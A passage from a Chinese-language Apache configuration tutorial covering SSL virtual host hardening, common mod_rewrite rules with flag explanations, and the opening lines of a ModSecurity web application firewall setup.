<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLUseStapling</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> on</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLStaplingCache</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> shmcb:${APACHE_RUN_DIR}/ssl_stapling(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">32768</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLStaplingResponderTimeout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 5</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLStaplingReturnResponderErrors</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> off</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # ====== 客户端证书验证 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 不要求客户端证书</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # SSLVerifyClient none</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 可选客户端证书</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # SSLVerifyClient optional</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 要求客户端证书</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # SSLVerifyClient require</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # SSLVerifyDepth 10</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # ====== DH参数（提高安全性）======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 自定义DH参数</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # SSLOpenSSLConfCmd DHParameters /etc/ssl/dhparam.pem</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # ====== HSTS配置 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_headers.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">            # HTTP严格传输安全</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> always </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Strict-Transport-Security &quot;max-age=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">31536000</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">; includeSubDomains; preload&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">            </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">            # 其他安全头</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> always </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> X-Frame-</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;SAMEORIGIN&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> always </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> X-Content-Type-</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;nosniff&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> always </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> X-XSS-Protection &quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">; mode=block&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # ====== SSL日志 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        ErrorLog</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_LOG_DIR}/ssl-error.log</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        CustomLog</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_LOG_DIR}/ssl-access.log combined</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # SSL专用日志格式</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # CustomLog ${APACHE_LOG_DIR}/ssl-request.log &quot;%t %h %{SSL_PROTOCOL}x %{SSL_CIPHER}x \&quot;%r\&quot; %b&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # ====== 目录配置 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> -Indexes +FollowSymLinks</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            AllowOverride</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> All</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # ====== SSL优化 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 禁用SSL压缩（防止CRIME攻击）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLCompression</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> off</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 启用HTTP/2（提高性能）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        Protocols h2 http/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 全局SSL配置 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 互斥锁配置（进程间同步）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># &lt;IfModule mod_ssl.c></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#     SSLMutex file:${APACHE_LOCK_DIR}/ssl_mutex</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># &lt;/IfModule></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 随机数种子</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># &lt;IfModule mod_ssl.c></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#     SSLRandomSeed startup builtin</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#     SSLRandomSeed startup file:/dev/urandom 512</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#     SSLRandomSeed connect builtin</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#     SSLRandomSeed connect file:/dev/urandom 512</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># &lt;/IfModule></span></span></code></pre></figure>
<hr/>
<h3 id="5-模块配置文件详解">5. 模块配置文件详解<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#5-模块配置文件详解" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<h5 id="51-mod_rewriteconf---url重写模块">5.1 mod_rewrite.conf - URL重写模块<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#51-mod_rewriteconf---url重写模块" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_rewrite.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 启用重写引擎</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteEngine</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 设置重写日志级别（0-9，0=禁用，9=详细）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 仅用于调试，生产环境应禁用</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # RewriteLog /var/log/apache2/rewrite.log</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # RewriteLogLevel 3</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 重写规则继承（虚拟主机）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteOptions</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Inherit</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<p><strong>常用重写规则示例：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在虚拟主机或.htaccess中使用</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_rewrite.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteEngine</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteBase</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 1. 强制HTTPS</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{HTTPS}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> off</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> ^(.*)$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> https://%{HTTP_HOST}/$1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [R=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">301</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,L]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 2. 强制www</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{HTTP_HOST}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> !^www\.</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [NC]</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> ^(.*)$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> https://www.%{HTTP_HOST}/$1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [R=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">301</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,L]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 3. 去除www</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{HTTP_HOST}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ^www\.(.+)$</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [NC]</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> ^(.*)$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> https://%1/$1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [R=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">301</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,L]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 4. URL美化（移除.php扩展名）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{REQUEST_FILENAME}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> !-d</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{REQUEST_FILENAME}.php</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> -f</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> ^(.*)$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> $1.php</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [L]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 5. 重定向旧URL到新URL</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> ^old-page\.html$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /new-page.html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [R=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">301</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,L]</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> ^products/(.*)$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /items/$1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [R=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">301</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,L]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 6. 阻止访问隐藏文件</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> &quot;(^|/)\.(?!well-known)&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [F]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 7. 阻止特定User-Agent</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{HTTP_USER_AGENT}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> (badbot|scraper)</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [NC]</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> .*</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [F,L]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 8. 防止图片盗链</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{HTTP_REFERER}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> !^$</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{HTTP_REFERER}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> !^https?://(www\.)?example\.com</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [NC]</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> \.(jpg|jpeg|png|gif)$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [F]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 9. 代理特定路径到后端</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> ^api/(.*)$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://localhost:3000/api/$1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [P,L]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 10. 维护模式</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{REQUEST_URI}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> !^/maintenance\.html$</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{REMOTE_ADDR}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> !^192\.168\.1\.</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> .*</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /maintenance.html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [R=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">503</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,L]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<p><strong>RewriteCond标志说明：</strong></p>
<ul>
<li><code>[NC]</code> - 不区分大小写</li>
<li><code>[OR]</code> - 或条件（默认是AND）</li>
</ul>
<p><strong>RewriteRule标志说明：</strong></p>
<ul>
<li><code>[L]</code> - Last（停止处理后续规则）</li>
<li><code>[R=301]</code> - 永久重定向</li>
<li><code>[R=302]</code> - 临时重定向</li>
<li><code>[F]</code> - Forbidden（返回403）</li>
<li><code>[G]</code> - Gone（返回410）</li>
<li><code>[P]</code> - Proxy（代理请求）</li>
<li><code>[QSA]</code> - 追加查询字符串</li>
<li><code>[NE]</code> - 不转义输出</li>
<li><code>[PT]</code> - Pass Through（传递给其他模块）</li>
</ul>
<h5 id="52-mod_securityconf---web应用防火墙">5.2 mod_security.conf - Web应用防火墙<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#52-mod_securityconf---web应用防火墙" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> security2_module</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 数据目录</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecDataDir /var/cache/modsecurity</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 规则引擎模式</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecRuleEngine </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">On</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">              # 启用（阻止攻击）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # SecRuleEngine DetectionOnly # 仅检测（不阻止）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # SecRuleEngine Off           # 关闭</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 请求体访问</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecRequestBodyAccess </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">On</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecRequestBodyLimit </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">13107200</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">            # 最大请求体大小（字节）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecRequestBodyNoFilesLimit </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">131072</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">       # 不包含文件上传的请求体限制</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
